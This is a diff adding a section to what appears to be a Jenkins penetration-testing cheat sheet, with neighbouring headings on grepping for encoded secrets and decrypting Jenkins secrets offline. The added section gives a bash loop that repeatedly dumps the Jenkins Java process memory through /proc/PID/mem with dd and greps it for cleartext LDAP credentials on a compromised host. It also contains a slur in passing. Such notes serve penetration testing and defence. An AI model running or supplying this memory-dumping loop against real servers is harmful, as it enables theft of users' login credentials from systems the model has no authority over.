@@ -146,6 +146,19 @@ grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
 ```
 
 
+Dumping LDAP credentials on a compromised machine
+=================================================
+
+If Jenkins is configured to verify user credentials by relaying them to a LDAP (which is retarded, but a common vulnerability in companies) it's possible to recover these cleartext user credentials by dumping the Java process' memory.
+Assuming PID 7 for the Jenkins server the following loop will perform a memory dump of the stack every 30 seconds:
+```bash
+head -n 1 /proc/7/maps
+a=<first hex number>
+b=<second hex number>
+while [ 1 ]; do dd if=/proc/7/mem bs=$(getconf PAGESIZE) iflag=skip_bytes,count_bytes skip=$((0x$a)) count=$((0x$b - 0x$a)) of=/tmp/tmp.bin; strings /tmp/tmp.bin | grep "uid=" && break; sleep 30; done
+```
+A small delay is important because the garbage collector will regularly free the credential structures.
+
 Decrypt Jenkins secrets offline
 ===============================
 
